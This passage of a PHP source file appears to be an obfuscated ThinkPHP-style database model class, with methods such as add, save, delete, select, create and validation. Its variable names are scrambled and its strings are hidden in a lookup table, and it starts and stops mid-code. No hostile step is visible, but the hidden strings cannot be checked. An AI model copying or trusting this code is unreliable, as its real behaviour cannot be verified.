$this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ğ™Ùü™¤[321]); } $this->db(0, empty($this->connection) ? $´›ÔÔÂÚ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $–àÊÏÜñ =& $_SERVER[ïÃ°£«Ê]; if (empty($this->fields)) { if (think_config($–àÊÏÜñ[322])) { $ì˜àúÜÄ = $this->dbName ? $this->dbName : think_config($–àÊÏÜñ[323]); $´¤óıöÊ = think_var_cache($–àÊÏÜñ[324] . strtolower(get_path_this($ì˜àúÜÄ) . $–àÊÏÜñ[10] . $this->name)); if ($´¤óıöÊ) { $Æä‘€Ãˆ = think_config($–àÊÏÜñ[325]); if (empty($Æä‘€Ãˆ) || $´¤óıöÊ[$–àÊÏÜñ[326]] == $Æä‘€Ãˆ) { $this->fields = $´¤óıöÊ; return; } } } $this->flush(); } } public function flush() { $¶ìñß =& $_SERVER[ïÃ°£«Ê]; $this->db->setModel($this->name); $öŞÊãÎĞ = $this->db->getFields($this->getTableName()); if (!$öŞÊãÎĞ) { return !1; } $this->fields = array_keys($öŞÊãÎĞ); $this->fields[$¶ìñß[327]] = !1; foreach ($öŞÊãÎĞ as $³…ÕĞúÛ => $öÕ…Ó›) { $ş§ìÒˆ¡[$³…ÕĞúÛ] = $öÕ…Ó›[$¶ìñß[33]]; if ($öÕ…Ó›[$¶ìñß[39]]) { $this->fields[$¶ìñß[328]] = $³…ÕĞúÛ; if ($öÕ…Ó›[$¶ìñß[42]]) { $this->fields[$¶ìñß[327]] = !0; } } } $this->fields[$¶ìñß[329]] = $ş§ìÒˆ¡; if (think_config($¶ìñß[325])) { $this->fields[$¶ìñß[326]] = think_config($¶ìñß[325]); } if (think_config($¶ìñß[322])) { $é–ÔçÎ = $this->dbName ? $this->dbName : think_config($¶ìñß[323]); think_var_cache($¶ìñß[324] . strtolower(get_path_this($é–ÔçÎ) . $¶ìñß[10] . $this->name), $this->fields); } } public function switchModel($«ª®¯İ, $Û¨Å‰› = array()) { $ˆæµåÜˆ =& $_SERVER[ïÃ°£«Ê]; $“Ã¼˜¤£ = ucwords(strtolower($«ª®¯İ)) . $ˆæµåÜˆ[330]; if (!class_exists($“Ã¼˜¤£)) { think_exception($“Ã¼˜¤£ . think_lang($ˆæµåÜˆ[331])); } $this->_extModel = new $“Ã¼˜¤£($this->name); if (!empty($Û¨Å‰›)) { foreach ($Û¨Å‰› as $úÀ€€ë‘) { $this->_extModel->setProperty($úÀ€€ë‘, $this->{$úÀ€€ë‘}); } } return $this->_extModel; } public function __set($óï›ãø´, $àÊñ) { $this->data[$óï›ãø´] = $àÊñ; } public function __get($ï§ÓÛ) { return isset($this->data[$ï§ÓÛ]) ? $this->data[$ï§ÓÛ] : null; } public function __isset($¼ßúêø´) { return isset($this->data[$¼ßúêø´]); } public function __unset($îª€Ëæß) { unset($this->data[$îª€Ëæß]); } public function __call($’Á˜Ú±–, $£•ŸÃÔ¥) { $¥€œ¿ñ =& $_SERVER[ïÃ°£«Ê]; if (in_array(strtolower($’Á˜Ú±–), $this->methods, !0)) { $this->options[strtolower($’Á˜Ú±–)] = $£•ŸÃÔ¥[0]; return $this; } elseif (in_array(strtolower($’Á˜Ú±–), array($¥€œ¿ñ[332], $¥€œ¿ñ[333], $¥€œ¿ñ[334], $¥€œ¿ñ[335], $¥€œ¿ñ[336]), !0)) { $§×É×š = isset($£•ŸÃÔ¥[0]) ? $£•ŸÃÔ¥[0] : $¥€œ¿ñ[220]; $§×É×š = $this->db->parseKey($§×É×š); return $this->getField(strtoupper($’Á˜Ú±–) . $¥€œ¿ñ[337] . $§×É×š . $¥€œ¿ñ[338] . $’Á˜Ú±–, $¥€œ¿ñ[332]); } elseif (strtolower(substr($’Á˜Ú±–, 0, 5)) == $¥€œ¿ñ[339]) { $§×É×š = think_parse_name(substr($’Á˜Ú±–, 5)); $İçŞ†èœ[$§×É×š] = $£•ŸÃÔ¥[0]; return $this->where($İçŞ†èœ)->find(); } elseif (strtolower(substr($’Á˜Ú±–, 0, 10)) == $¥€œ¿ñ[340]) { $âğÕöÙŸ = think_parse_name(substr($’Á˜Ú±–, 10)); $İçŞ†èœ[$âğÕöÙŸ] = $£•ŸÃÔ¥[0]; return $this->where($İçŞ†èœ)->getField($£•ŸÃÔ¥[1]); } elseif (isset($this->_scope[$’Á˜Ú±–])) { return $this->scope($’Á˜Ú±–, $£•ŸÃÔ¥[0]); } elseif (method_exists($this, $’Á˜Ú±–) || method_exists($this, $¥€œ¿ñ[341] . $’Á˜Ú±–)) { array_unshift($£•ŸÃÔ¥, $’Á˜Ú±–); return call_user_func_array(array($this, $¥€œ¿ñ[342]), $£•ŸÃÔ¥); } else { return call_user_func_array(array(parent, $’Á˜Ú±–), $£•ŸÃÔ¥); } } protected function call() { $˜“¨„à =& $_SERVER[ïÃ°£«Ê]; $£üÂÙø¾ = func_get_args(); $›œŠÔ› = array_shift($£üÂÙø¾); $Ô«š–›¬ = $›œŠÔ›; if (is_array($›œŠÔ›)) { $Ô«š–›¬ = $›œŠÔ›[1]; $›œŠÔ› = $›œŠÔ›[0]; } $Ø¶­‹ØÊ = count($£üÂÙø¾) - 1; if (isset($£üÂÙø¾[$Ø¶­‹ØÊ]) && $£üÂÙø¾[$Ø¶­‹ØÊ] === $›œŠÔ›) { think_exception(__CLASS__ . $˜“¨„à[4] . $›œŠÔ› . think_lang($˜“¨„à[343])); return; } $£üÂÙø¾[] = $›œŠÔ›; if (method_exists($this, $˜“¨„à[344])) { $›™“¯ = call_user_func_array(array($this, $˜“¨„à[345]), array($Ô«š–›¬, $£üÂÙø¾)); if (!is_null($›™“¯) && $›™“¯ !== !1) { return $›™“¯; } } $¬”ÎÒœ = !1; if (method_exists($this, $›œŠÔ›)) { $¬”ÎÒœ = call_user_func_array(array($this, $›œŠÔ›), $£üÂÙø¾); } if (method_exists($this, $˜“¨„à[346])) { $›™“¯ = call_user_func_array(array($this, $˜“¨„à[347]), array($Ô«š–›¬, $£üÂÙø¾, $¬”ÎÒœ)); if ($›™“¯) { return $›™“¯; } } return $¬”ÎÒœ; } protected function _initialize() { } protected function _facade($Ó¯âÛ²) { $™üéœñ† =& $_SERVER[ïÃ°£«Ê]; if (!empty($this->fields)) { foreach ($Ó¯âÛ² as $Û•ñÁé => $£ë•æÏ¹) { if (is_array($this->fields) && !in_array($Û•ñÁé, $this->fields, !0)) { unset($Ó¯âÛ²[$Û•ñÁé]); } elseif (is_scalar($£ë•æÏ¹)) { $this->_parseType($Ó¯âÛ², $Û•ñÁé); } } } if (!empty($this->options[$™üéœñ†[348]])) { $Ó¯âÛ² = array_map($this->options[$™üéœñ†[348]], $Ó¯âÛ²); unset($this->options[$™üéœñ†[348]]); } $this->_beforeWrite($Ó¯âÛ²); return $Ó¯âÛ²; } protected function _beforeWrite(&$€â¼İ­ƒ) { } public function add($¬ÄÅ©Êä = '', $ºØ®£ = array(), $Ÿ†ôÛİÄ = false) { if (empty($¬ÄÅ©Êä)) { if (!empty($this->data)) { $¬ÄÅ©Êä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ïÃ°£«Ê][349]); return !1; } } $ºØ®£ = $this->_parseOptions($ºØ®£); $¬ÄÅ©Êä = $this->_facade($¬ÄÅ©Êä); if (!1 === $this->_beforeInsert($¬ÄÅ©Êä, $ºØ®£)) { return !1; } $¦ÍªıëÔ = $this->db->insert($¬ÄÅ©Êä, $ºØ®£, $Ÿ†ôÛİÄ); if (!1 !== $¦ÍªıëÔ) { $›ĞØÛœà = $this->getLastInsID(); if ($›ĞØÛœà) { $¬ÄÅ©Êä[$this->getPk()] = $›ĞØÛœà; $this->_after_insert($¬ÄÅ©Êä, $ºØ®£); return $›ĞØÛœà; } $this->_after_insert($¬ÄÅ©Êä, $ºØ®£); } return $¦ÍªıëÔ; } protected function _beforeInsert(&$Ş¤ºòµœ, $ÙìÎñ½ë) { } protected function _after_insert($ÖõñÔû, $ÇîÔ€) { } public function addAll($ €Æñ£Â, $¯ÃóÓ¸… = array(), $ÚğñŒ—­ = false) { $©›½Ï¬Ò =& $_SERVER[ïÃ°£«Ê]; if (empty($ €Æñ£Â)) { $this->error = think_lang($©›½Ï¬Ò[349]); return !1; } $¯ÃóÓ¸… = $this->_parseOptions($¯ÃóÓ¸…); foreach ($ €Æñ£Â as $şŸ—÷À => $ëÆ–¹è¦) { $ €Æñ£Â[$şŸ—÷À] = $this->_facade($ëÆ–¹è¦); } if (method_exists($this->db, $©›½Ï¬Ò[350])) { $ªóÓíúš = $this->db->insertAll($ €Æñ£Â, $¯ÃóÓ¸…, $ÚğñŒ—­); } else { $this->startTrans(); foreach ($ €Æñ£Â as $şŸ—÷À => $ëÆ–¹è¦) { $ªóÓíúš = $this->db->insert($ëÆ–¹è¦, $¯ÃóÓ¸…, $ÚğñŒ—­); } $this->commit(); } if (!1 !== $ªóÓíúš) { $¶¸í»œ = $this->getLastInsID(); if ($¶¸í»œ) { return $¶¸í»œ; } } return $ªóÓíúš; } public function selectAdd($ôÌ¢·³× = '', $Ö¼–¦ƒ  = '', $ÉŞÌ¢ÖĞ = array()) { $ñÛÈ =& $_SERVER[ïÃ°£«Ê]; $ÉŞÌ¢ÖĞ = $this->_parseOptions($ÉŞÌ¢ÖĞ); if (!1 === ($ÛÙ“¿…Ê = $this->db->selectInsert($ôÌ¢·³× ? $ôÌ¢·³× : $ÉŞÌ¢ÖĞ[$ñÛÈ[351]], $Ö¼–¦ƒ  ? $Ö¼–¦ƒ  : $this->getTableName(), $ÉŞÌ¢ÖĞ))) { $this->error = think_lang($ñÛÈ[352]); return !1; } else { return $ÛÙ“¿…Ê; } } public function save($™ûÜÁí = '', $û¨–‘ò¼ = array()) { $›øƒÁ =& $_SERVER[ïÃ°£«Ê]; if (empty($™ûÜÁí)) { if (!empty($this->data)) { $™ûÜÁí = $this->data; $this->data = array(); } else { $this->error = think_lang($›øƒÁ[349]); return !1; } } $™ûÜÁí = $this->_facade($™ûÜÁí); $û¨–‘ò¼ = $this->_parseOptions($û¨–‘ò¼); $«¹î‹œ = $this->getPk(); if (!isset($û¨–‘ò¼[$›øƒÁ[353]])) { if (isset($™ûÜÁí[$«¹î‹œ])) { $í´ç ãà[$«¹î‹œ] = $™ûÜÁí[$«¹î‹œ]; $û¨–‘ò¼[$›øƒÁ[353]] = $í´ç ãà; unset($™ûÜÁí[$«¹î‹œ]); } else { $this->error = think_lang($›øƒÁ[352]); return !1; } } if (is_array($û¨–‘ò¼[$›øƒÁ[353]]) && isset($û¨–‘ò¼[$›øƒÁ[353]][$«¹î‹œ])) { $£™ü¢è· = $û¨–‘ò¼[$›øƒÁ[353]][$«¹î‹œ]; } if (!1 === $this->_beforeUpdate($™ûÜÁí, $û¨–‘ò¼)) { return !1; } $åı ¹á“ = $this->db->update($™ûÜÁí, $û¨–‘ò¼); if (!1 !== $åı ¹á“) { if (isset($£™ü¢è·)) { $™ûÜÁí[$«¹î‹œ] = $£™ü¢è·; } $this->_afterUpdate($™ûÜÁí, $û¨–‘ò¼); } return $åı ¹á“; } protected function _beforeUpdate(&$¼å•ÛŸ, $µİßŠŠ²) { } protected function _afterUpdate($Ç×´††, $áäå ÖÇ) { } public function delete($ç·È’ÇÈ = array()) { $òÇ’¬ğİ =& $_SERVER[ïÃ°£«Ê]; if (empty($ç·È’ÇÈ) && empty($this->options[$òÇ’¬ğİ[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $­æÊ½Ê = $this->getPk(); if (is_numeric($ç·È’ÇÈ) || is_string($ç·È’ÇÈ)) { if (strpos($ç·È’ÇÈ, $òÇ’¬ğİ[50])) { $’Ÿ’‹å´[$­æÊ½Ê] = array($òÇ’¬ğİ[354], $ç·È’ÇÈ); } else { $’Ÿ’‹å´[$­æÊ½Ê] = $ç·È’ÇÈ; } $this->options[$òÇ’¬ğİ[353]] = $’Ÿ’‹å´; } $ç·È’ÇÈ = $this->_parseOptions(); if (is_array($ç·È’ÇÈ[$òÇ’¬ğİ[353]]) && isset($ç·È’ÇÈ[$òÇ’¬ğİ[353]][$­æÊ½Ê])) { $Ïª¶‰«£ = $ç·È’ÇÈ[$òÇ’¬ğİ[353]][$­æÊ½Ê]; } $›ŞıŒ×Ì = $this->db->delete($ç·È’ÇÈ); if (!1 !== $›ŞıŒ×Ì) { $õñ™à¦› = array(); if (isset($Ïª¶‰«£)) { $õñ™à¦›[$­æÊ½Ê] = $Ïª¶‰«£; } $this->_after_delete($õñ™à¦›, $ç·È’ÇÈ); } return $›ŞıŒ×Ì; } protected function _after_delete($½áíº™Ñ, $ŞºÉ­ÔÎ) { } public function select($ÁÜ ››‚ = array()) { $èô±³ =& $_SERVER[ïÃ°£«Ê]; if (is_string($ÁÜ ››‚) || is_numeric($ÁÜ ››‚)) { $±è ªÚñ = $this->getPk(); if (strpos($ÁÜ ››‚, $èô±³[50])) { $‰½›ªù†[$±è ªÚñ] = array($èô±³[354], $ÁÜ ››‚); } else { $‰½›ªù†[$±è ªÚñ] = $ÁÜ ››‚; } $this->options[$èô±³[353]] = $‰½›ªù†; } elseif (!1 === $ÁÜ ››‚) { $ÁÜ ››‚ = $this->_parseOptions(); return $èô±³[355] . $this->db->buildSelectSql($ÁÜ ››‚) . $èô±³[356]; } $ÁÜ ››‚ = $this->_parseOptions(); $ø”¶ù¿Å = $this->db->select($ÁÜ ››‚); if (!1 === $ø”¶ù¿Å) { return !1; } if (empty($ø”¶ù¿Å)) { return null; } $this->_afterSelect($ø”¶ù¿Å, $ÁÜ ››‚); return $ø”¶ù¿Å; } protected function _afterSelect(&$ªº™ãëà, $À‰»õ×) { } public function buildSql($„¿ùáã¹ = array()) { $¡»à£ğ• =& $_SERVER[ïÃ°£«Ê]; $„¿ùáã¹ = $this->_parseOptions($„¿ùáã¹); return $¡»à£ğ•[355] . $this->db->buildSelectSql($„¿ùáã¹) . $¡»à£ğ•[356]; } public function optionsValue($ÎäŸ¾Í = null) { if (is_null($ÎäŸ¾Í)) { return $this->options; } elseif (is_array($ÎäŸ¾Í)) { $this->options = array_merge($this->options, $ÎäŸ¾Í); } } protected function _parseOptions($÷‰’Ã¬ = array()) { $’½÷•€ =& $_SERVER[ïÃ°£«Ê]; if (is_array($÷‰’Ã¬)) { $÷‰’Ã¬ = array_merge($this->options, $÷‰’Ã¬); } $this->options = array(); if (!isset($÷‰’Ã¬[$’½÷•€[357]])) { $÷‰’Ã¬[$’½÷•€[357]] = $this->getTableName(); $ã÷ş¸’ = $this->fields; } else { $ã÷ş¸’ = $this->getDbFields(); } if (!empty($÷‰’Ã¬[$’½÷•€[358]])) { $÷‰’Ã¬[$’½÷•€[357]] .= $’½÷•€[53] . $÷‰’Ã¬[$’½÷•€[358]]; } $÷‰’Ã¬[$’½÷•€[359]] = $this->name; if (isset($÷‰’Ã¬[$’½÷•€[353]]) && is_array($÷‰’Ã¬[$’½÷•€[353]]) && !empty($ã÷ş¸’) && !isset($÷‰’Ã¬[$’½÷•€[360]]) && !isset($÷‰’Ã¬[$’½÷•€[357]])) { foreach ($÷‰’Ã¬[$’½÷•€[353]] as $úÚè£—› => $Ö§öÛû‰) { $úÚè£—› = trim($úÚè£—›); if (in_array($úÚè£—›, $ã÷ş¸’, !0)) { if (is_scalar($Ö§öÛû‰)) { $this->_parseType($÷‰’Ã¬[$’½÷•€[353]], $úÚè£—›); } } elseif (!is_numeric($úÚè£—›) && $’½÷•€[11] != substr($úÚè£—›, 0, 1) && !1 === strpos($úÚè£—›, $’½÷•€[10]) && !1 === strpos($úÚè£—›, $’½÷•€[337]) && !1 === strpos($úÚè£—›, $’½÷•€[212]) && !1 === strpos($úÚè£—›, $’½÷•€[284])) { unset($÷‰’Ã¬[$’½÷•€[353]][$úÚè£—›]); } } } $this->_options_filter($÷‰’Ã¬); return $÷‰’Ã¬; } protected function _options_filter(&$ò§¼¸é…) { } protected function _parseType(&$ô‘“Œ…ü, $ÈƒöØŸ) { $¨Í¾¤—ù =& $_SERVER[ïÃ°£«Ê]; if (empty($this->options[$¨Í¾¤—ù[361]][$¨Í¾¤—ù[4] . $ÈƒöØŸ])) { $ÛÔ·©º = strtolower($this->fields[$¨Í¾¤—ù[329]][$ÈƒöØŸ]); if (!1 !== strpos($ÛÔ·©º, $¨Í¾¤—ù[362])) { } elseif (!1 === strpos($ÛÔ·©º, $¨Í¾¤—ù[363]) && !1 !== strpos($ÛÔ·©º, $¨Í¾¤—ù[364])) { $ô‘“Œ…ü[$ÈƒöØŸ] = intval($ô‘“Œ…ü[$ÈƒöØŸ]); } elseif (!1 !== strpos($ÛÔ·©º, $¨Í¾¤—ù[365]) || !1 !== strpos($ÛÔ·©º, $¨Í¾¤—ù[366])) { $ô‘“Œ…ü[$ÈƒöØŸ] = floatval($ô‘“Œ…ü[$ÈƒöØŸ]); } elseif (!1 !== strpos($ÛÔ·©º, $¨Í¾¤—ù[367])) { $ô‘“Œ…ü[$ÈƒöØŸ] = (bool) $ô‘“Œ…ü[$ÈƒöØŸ]; } } } public function find($²ã¤÷“ = array()) { $æÜ”èÁ =& $_SERVER[ïÃ°£«Ê]; if (is_numeric($²ã¤÷“) || is_string($²ã¤÷“)) { $åÕ¸À[$this->getPk()] = intval($²ã¤÷“); $this->options[$æÜ”èÁ[353]] = $åÕ¸À; } $this->options[$æÜ”èÁ[368]] = 1; $²ã¤÷“ = $this->_parseOptions(); $ µÜÍ = $this->db->select($²ã¤÷“); if (!1 === $ µÜÍ) { return !1; } if (empty($ µÜÍ)) { return null; } $¢åûò¯© = $ µÜÍ[0]; $this->_afterFind($¢åûò¯©, $²ã¤÷“); return $¢åûò¯©; } protected function _afterFind(&$×€ƒÕ½Š, $°¢™õ¿Á) { } protected function returnResult($†ß›–çô, $ø…èñù‡ = '') { $€‚¶½Ä° =& $_SERVER[ïÃ°£«Ê]; if ($ø…èñù‡) { if (is_callable($ø…èñù‡)) { return call_user_func($ø…èñù‡, $†ß›–çô); } switch (strtolower($ø…èñù‡)) { case $€‚¶½Ä°[369]: return json_encode($†ß›–çô); case $€‚¶½Ä°[370]: return xml_encode($†ß›–çô); } } return $†ß›–çô; } public function parseFieldsMap($ÃşèÒ©, $‚‡£şÓ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ô¬ºÈ²¨ => $¸È›äòâ) { if ($‚‡£şÓ == 1) { if (isset($ÃşèÒ©[$¸È›äòâ])) { $ÃşèÒ©[$ô¬ºÈ²¨] = $ÃşèÒ©[$¸È›äòâ]; unset($ÃşèÒ©[$¸È›äòâ]); } } else { if (isset($ÃşèÒ©[$ô¬ºÈ²¨])) { $ÃşèÒ©[$¸È›äòâ] = $ÃşèÒ©[$ô¬ºÈ²¨]; unset($ÃşèÒ©[$ô¬ºÈ²¨]); } } } } return $ÃşèÒ©; } public function setField($Ûõ²¯ˆ¦, $Ù²û¡€¸ = '') { if (is_array($Ûõ²¯ˆ¦)) { $ûÀÉĞ…œ = $Ûõ²¯ˆ¦; } else { $ûÀÉĞ…œ[$Ûõ²¯ˆ¦] = $Ù²û¡€¸; } return $this->save($ûÀÉĞ…œ); } public function setAdd($âØÊ˜›, $»Ş ï½Ê = 1) { $‹±ê©Èµ =& $_SERVER[ïÃ°£«Ê]; $Ãô·ëÏ£ = $âØÊ˜› . $‹±ê©Èµ[371] . $»Ş ï½Ê; if ($»Ş ï½Ê < 0) { $Ãô·ëÏ£ = $âØÊ˜› . $»Ş ï½Ê; } return $this->setField($âØÊ˜›, array($‹±ê©Èµ[372], $Ãô·ëÏ£)); } public function getField($Şä¬™ƒ, $ß»â¾ÂÒ = null) { $¡Ù’¯Í§ =& $_SERVER[ïÃ°£«Ê]; $âºÕ×¯[$¡Ù’¯Í§[351]] = $Şä¬™ƒ; $âºÕ×¯ = $this->_parseOptions($âºÕ×¯); $Şä¬™ƒ = trim($Şä¬™ƒ); if (strpos($Şä¬™ƒ, $¡Ù’¯Í§[50])) { if (!isset($âºÕ×¯[$¡Ù’¯Í§[368]])) { $âºÕ×¯[$¡Ù’¯Í§[368]] = is_numeric($ß»â¾ÂÒ) ? $ß»â¾ÂÒ : $¡Ù’¯Í§[12]; } $Ñõ„ì¯í = $this->db->select($âºÕ×¯); if (!empty($Ñõ„ì¯í)) { $€ĞĞÔØú = explode($¡Ù’¯Í§[50], $Şä¬™ƒ); $Şä¬™ƒ = array_keys($Ñõ„ì¯í[0]); $¦¡‚è = array_shift($Şä¬™ƒ); $œ¯›õßÚ = array_shift($Şä¬™ƒ); $è……™­¡ = array(); $éåÇŠÙ‘ = count($€ĞĞÔØú); foreach ($Ñõ„ì¯í as $Ú³ŒéšŒ) { $Æü¼’«ü = $Ú³ŒéšŒ[$¦¡‚è]; if (2 == $éåÇŠÙ‘) { $è……™­¡[$Æü¼’«ü] = $Ú³ŒéšŒ[$œ¯›õßÚ]; } else { $è……™­¡[$Æü¼’«ü] = is_string($ß»â¾ÂÒ) ? implode($ß»â¾ÂÒ, $Ú³ŒéšŒ) : $Ú³ŒéšŒ; } } return $è……™­¡; } } else { if (!0 !== $ß»â¾ÂÒ) { $âºÕ×¯[$¡Ù’¯Í§[368]] = is_numeric($ß»â¾ÂÒ) ? $ß»â¾ÂÒ : 1; } if ($ß»â¾ÂÒ === $¡Ù’¯Í§[332]) { unset($âºÕ×¯[$¡Ù’¯Í§[368]]); } $Ú³ŒéšŒ = $this->db->select($âºÕ×¯); if (!empty($Ú³ŒéšŒ)) { if ($ß»â¾ÂÒ === $¡Ù’¯Í§[332]) { return reset($Ú³ŒéšŒ[0]); } if (!0 !== $ß»â¾ÂÒ && 1 == $âºÕ×¯[$¡Ù’¯Í§[368]]) { return reset($Ú³ŒéšŒ[0]); } foreach ($Ú³ŒéšŒ as $±¥·ç›‘) { $ëÙáÔÚ“[] = $±¥·ç›‘[$Şä¬™ƒ]; } return $ëÙáÔÚ“; } } return null; } public function create($‰­á¬« = '', $äÃ¥ = '') { $¦ŸüÄ–Â =& $_SERVER[ïÃ°£«Ê]; if (empty($‰­á¬«)) { $‰­á¬« = $_POST; } elseif (is_object($‰­á¬«)) { $‰­á¬« = get_object_vars($‰­á¬«); } if (empty($‰­á¬«) || !is_array($‰­á¬«)) { $this->error = think_lang($¦ŸüÄ–Â[349]); return !1; } $‰­á¬« = $this->parseFieldsMap($‰­á¬«, 0); $äÃ¥ = $äÃ¥ ? $äÃ¥ : (!empty($‰­á¬«[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¦ŸüÄ–Â[351]])) { $´ºË±®© = $this->options[$¦ŸüÄ–Â[351]]; unset($this->options[$¦ŸüÄ–Â[351]]); } elseif ($äÃ¥ == THINK_MODEL_INSERT && isset($this->insertFields)) { $´ºË±®© = $this->insertFields; } elseif ($äÃ¥ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $´ºË±®© = $this->updateFields; } if (isset($´ºË±®©)) { if (is_string($´ºË±®©)) { $´ºË±®© = explode($¦ŸüÄ–Â[50], $´ºË±®©); } if (think_config($¦ŸüÄ–Â[373])) { $´ºË±®©[] = think_config($¦ŸüÄ–Â[374]); } foreach ($‰­á¬« as $ãØş²ÜÓ => $È«Û”­×) { if (!in_array($ãØş²ÜÓ, $´ºË±®©)) { unset($‰­á¬«[$ãØş²ÜÓ]); } } } if (!$this->autoValidation($‰­á¬«, $äÃ¥)) { return !1; } if (!$this->autoCheckToken($‰­á¬«)) { $this->error = think_lang($¦ŸüÄ–Â[375]); return !1; } if ($this->autoCheckFields) { $´ºË±®© = $this->getDbFields(); foreach ($‰­á¬« as $ãØş²ÜÓ => $È«Û”­×) { if (!in_array($ãØş²ÜÓ, $´ºË±®©)) { unset($‰­á¬«[$ãØş²ÜÓ]); } elseif (MAGIC_QUOTES_GPC && is_string($È«Û”­×)) { $‰­á¬«[$ãØş²ÜÓ] = stripslashes($È«Û”­×); } } } $this->autoOperation($‰­á¬«, $äÃ¥); $this->data = $‰­á¬«; return $‰­á¬«; } public function autoCheckToken($“à—œÚğ) { $ú“·¼Ïò =& $_SERVER[ïÃ°£«Ê]; if (isset($this->options[$ú“·¼Ïò[376]]) && !$this->options[$ú“·¼Ïò[376]]) { return !0; } if (think_config($ú“·¼Ïò[373])) { $ãê«§ü = think_config($ú“·¼Ïò[374]); if (!isset($“à—œÚğ[$ãê«§ü]) || Session::get($ãê«§ü)) { return !1; } list($İÉïıñ, $ºÅë«•ı) = explode($ú“·¼Ïò[11], $“à—œÚğ[$ãê«§ü]); if ($ºÅë«•ı && Session::get($ãê«§ü . $ú“·¼Ïò[10] . $İÉïıñ) === $ºÅë«•ı) { Session::remove($ãê«§ü . $ú“·¼Ïò[10] . $İÉïıñ); return !0; } if (think_config($ú“·¼Ïò[377])) { Session::remove($ãê«§ü . $ú“·¼Ïò[10] . $İÉïıñ); } return !1; } return !0; } public function regex($±ºÒ¤ß, $Ïâõª²Õ) { $ßÜ¯»ÑÇ =& $_SERVER[ïÃ°£«Ê]; $ÒšÈ¢š‚ = array($ßÜ¯»ÑÇ[378] => $ßÜ¯»ÑÇ[379], $ßÜ¯»ÑÇ[380] => $ßÜ¯»ÑÇ[381], $ßÜ¯»ÑÇ[382] => $ßÜ¯»ÑÇ[383], $ßÜ¯»ÑÇ[384] => $ßÜ¯»ÑÇ[385], $ßÜ¯»ÑÇ[386] => $ßÜ¯»ÑÇ[387], $ßÜ¯»ÑÇ[388] => $ßÜ¯»ÑÇ[389], $ßÜ¯»ÑÇ[390] => $ßÜ¯»ÑÇ[391], $ßÜ¯»ÑÇ[366] => $ßÜ¯»ÑÇ[392], $ßÜ¯»ÑÇ[393] => $ßÜ¯»ÑÇ[394]); if (isset($ÒšÈ¢š‚[strtolower($Ïâõª²Õ)])) { $Ïâõª²Õ = $ÒšÈ¢š‚[strtolower($Ïâõª²Õ)]; } return preg_match($Ïâõª²Õ, $±ºÒ¤ß) === 1; } private function autoOperation(&$“ê¹àËÊ, $¿âÏÃË) { $ÓüÄ„¢½ =& $_SERVER[ïÃ°£«Ê]; if (!empty($this->options[$ÓüÄ„¢½[395]])) { $¡èÜ²©Å = $this->options[$ÓüÄ„¢½[395]]; unset($this->options[$ÓüÄ„¢½[395]]); } elseif (!empty($this->_auto)) { $¡èÜ²©Å = $this->_auto; } if (isset($¡èÜ²©Å)) { foreach ($¡èÜ²©Å as $œ§‚¡§ü) { if (empty($œ§‚¡§ü[2])) { $œ§‚¡§ü[2] = THINK_MODEL_INSERT; } if ($¿âÏÃË == $œ§‚¡§ü[2] || $œ§‚¡§ü[2] == THINK_MODEL_BOTH) { switch (trim($œ§‚¡§ü[3])) { case $ÓüÄ„¢½[396]: case $ÓüÄ„¢½[397]: $ŠÍ‡Üë  = isset($œ§‚¡§ü[4]) ? (array) $œ§‚¡§ü[4] : array(); if (isset($“ê¹àËÊ[$œ§‚¡§ü[0]])) { array_unshift($ŠÍ‡Üë , $“ê¹àËÊ[$œ§‚¡§ü[0]]); } if ($ÓüÄ„¢½[396] == $œ§‚¡§ü[3]) { $“ê¹àËÊ[$œ§‚¡§ü[0]] = call_user_func_array($œ§‚¡§ü[1], $ŠÍ‡Üë ); } else { $“ê¹àËÊ[$œ§‚¡§ü[0]] = call_user_func_array(array(&$this, $œ§‚¡§ü[1]), $ŠÍ‡Üë ); } break; case $ÓüÄ„¢½[351]: $“ê¹àËÊ[$œ§‚¡§ü[0]] = $“ê¹àËÊ[$œ§‚¡§ü[1]]; break; case $ÓüÄ„¢½[398]: if ($ÓüÄ„¢½[12] === $“ê¹àËÊ[$œ§‚¡§ü[0]]) { unset($“ê¹àËÊ[$œ§‚¡§ü[0]]); } break; case $ÓüÄ„¢½[399]: default: $“ê¹àËÊ[$œ§‚¡§ü[0]] = $œ§‚¡§ü[1]; } if (!1 === $“ê¹àËÊ[$œ§‚¡§ü[0]]) { unset($“ê¹àËÊ[$œ§‚¡§ü[0]]); } } } } return $“ê¹àËÊ; } protected function autoValidation($äÇá›ğ¹, $¨îö¨ûá) { $šïä”÷ =& $_SERVER[ïÃ°£«Ê]; if (!empty($this->options[$šïä”÷[400]])) { $€£¨íˆ€ = $this->options[$šïä”÷[400]]; unset($this->options[$šïä”÷[400]]); } elseif (!empty($this->_validate)) { $€£¨íˆ€ = $this->_validate; } if (isset($€£¨íˆ€)) { if ($this->patchValidate) { $this->error = array(); } foreach ($€£¨íˆ€ as $Ìœ¶„Ô => $ó¯¬í®½) { if (empty($ó¯¬í®½[5]) || $ó¯¬í®½[5] == THINK_MODEL_BOTH || $ó¯¬í®½[5] == $¨îö¨ûá) { if (0 == strpos($ó¯¬í®½[2], $šïä”÷[401]) && strpos($ó¯¬í®½[2], $šïä”÷[402])) { $ó¯¬í®½[2] = think_lang(substr($ó¯¬í®½[2], 2, -1)); } $ó¯¬í®½[3] = isset($ó¯¬í®½[3]) ? $ó¯¬í®½[3] : THINK_EXISTS_VALIDATE; $ó¯¬í®½[4] = isset($ó¯¬í®½[4]) ? $ó¯¬í®½[4] : $šïä”÷[403]; switch ($ó¯¬í®½[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($äÇá›ğ¹, $ó¯¬í®½)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($šïä”÷[12] != trim($äÇá›ğ¹[$ó¯¬í®½[0]])) { if (!1 === $this->_validationField($äÇá›ğ¹, $ó¯¬í®½)) { return !1; } } break; default: if (isset($äÇá›ğ¹[$ó¯¬í®½[0]])) { if (!1 === $this->_validationField($äÇá›ğ¹, $ó¯¬í®½)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($’ÎÇÇÏÑ, 